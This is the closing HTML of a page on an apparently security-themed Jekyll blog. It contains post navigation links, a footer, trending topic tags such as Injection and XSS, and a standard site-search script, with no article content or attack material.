  Navigation buttons at the bottom of the post.
-->

<div class="post-navigation d-flex justify-content-between">
  
  <a href="/API-Key-Leaks/" class="btn btn-outline-primary"
    prompt="Older">
    <p>Api Key Leaks</p>
  </a>
  

  
  <a href="/Insecure-Source-Code-Management/" class="btn btn-outline-primary"
    prompt="Newer">
    <p>Insecure Source Code Management</p>
  </a>
  

</div>


    

    </div> <!-- #post-extend-wrapper -->

  </div> <!-- .col-* -->

</div> <!-- .row -->



        <!--
  The Footer
-->

<footer class="d-flex w-100 justify-content-center">
  <div class="d-flex justify-content-between align-items-center">
    <div class="footer-left">
      <p class="mb-0">
        © 2022
        <a href="https://twitter.com/Zxce3_">Zxce3</a>.
        
        <span data-toggle="tooltip" data-placement="top"
          title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span>
        
      </p>
    </div>

    <div class="footer-right">
      <p class="mb-0">
        Powered by
        <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>
        with
        <a href="https://github.com/cotes2020/jekyll-theme-chirpy"
          target="_blank" rel="noopener">Chirpy</a>
        theme.
      </p>
    </div>

  </div> <!-- div.d-flex -->
</footer>


      </div>

      <!--
  The Search results
-->
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-12 col-sm-11 post-content">
    <div id="search-hints">
      <h4 class="text-muted mb-4">Trending Tags</h4>

      















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        



      
        
        <a class="post-tag" href="/tags/injection/">Injection</a>
      
        
        <a class="post-tag" href="/tags/database/">Database</a>
      
        
        <a class="post-tag" href="/tags/server/">Server</a>
      
        
        <a class="post-tag" href="/tags/network/">Network</a>
      
        
        <a class="post-tag" href="/tags/windows/">Windows</a>
      
        
        <a class="post-tag" href="/tags/exploits/">Exploits</a>
      
        
        <a class="post-tag" href="/tags/shell/">Shell</a>
      
        
        <a class="post-tag" href="/tags/sql/">SQL</a>
      
        
        <a class="post-tag" href="/tags/xss/">XSS</a>
      
        
        <a class="post-tag" href="/tags/attack/">Attack</a>
      

    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>


    </div> <!-- #main-wrapper -->

    

    <div id="mask"></div>

    <a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button">
      <i class="fas fa-angle-up"></i>
    </a>

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script>

<script>
SimpleJekyllSearch({
  searchInput: document.getElementById('search-input'),
  resultsContainer: document.getElementById('search-results'),
  json: '/assets/js/data/search.json',
  searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0">  <a href="http://localhost:4000{url}">{title}</a>  <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">    {categories}    {tags}  </div>  <p>{snippet}</p></div>',
  noResultsText: '<p class="mt-5">Oops! No result founds.</p>',
  templateMiddleware: function(prop, value, template) {
    if (prop === 'categories') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
      }
    }

    if (prop === 'tags') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
      }
    }
  }
});
</script>


  </body>

</html>

